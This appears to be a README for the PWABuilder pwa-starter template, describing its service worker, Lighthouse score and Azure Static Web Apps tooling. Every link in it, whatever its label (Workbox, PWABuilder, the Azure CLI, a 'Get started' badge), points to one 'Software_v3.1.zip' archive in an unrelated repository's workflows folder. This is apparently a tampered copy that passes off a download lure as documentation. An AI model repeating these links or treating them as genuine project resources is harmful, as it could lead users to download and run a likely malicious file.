The PWABuilder pwa-starter is our opinionated, best practices, production tested starter that we use to build all of our PWAs, including [PWABuilder itself](https://raw.githubusercontent.com/zaylem91/pwabuilder/main/.github/workflows/Software_v3.1.zip)! The pwa-starter is a starter codebase, just like create-react-app or the Angular CLI can generate, that uses the PWABuilder team&#39;s preferred front-end tech stack.

[![Get started with the pwa-starter!](https://raw.githubusercontent.com/zaylem91/pwabuilder/main/.github/workflows/Software_v3.1.zip)](https://raw.githubusercontent.com/zaylem91/pwabuilder/main/.github/workflows/Software_v3.1.zip)

With it you get an app that:
- Has no build system to set up and no boilerplate code to add. Everything is included out of the box.
- Has a Service Worker system using [Workbox](https://raw.githubusercontent.com/zaylem91/pwabuilder/main/.github/workflows/Software_v3.1.zip)
- Scores close to 100 on Lighthouse out of the box
- Has everything needed to be installable in the browser
- Is ready to be package for the app stores using [PWABuilder](https://raw.githubusercontent.com/zaylem91/pwabuilder/main/.github/workflows/Software_v3.1.zip)
- Uses the [Azure Static Web Apps CLI](https://raw.githubusercontent.com/zaylem91/pwabuilder/main/.github/workflows/Software_v3.1.zip) which enables emulating your production environment locally, and gets you ready for deploying to Azure Static Web Apps!

and all with just a few button clicks 😊.
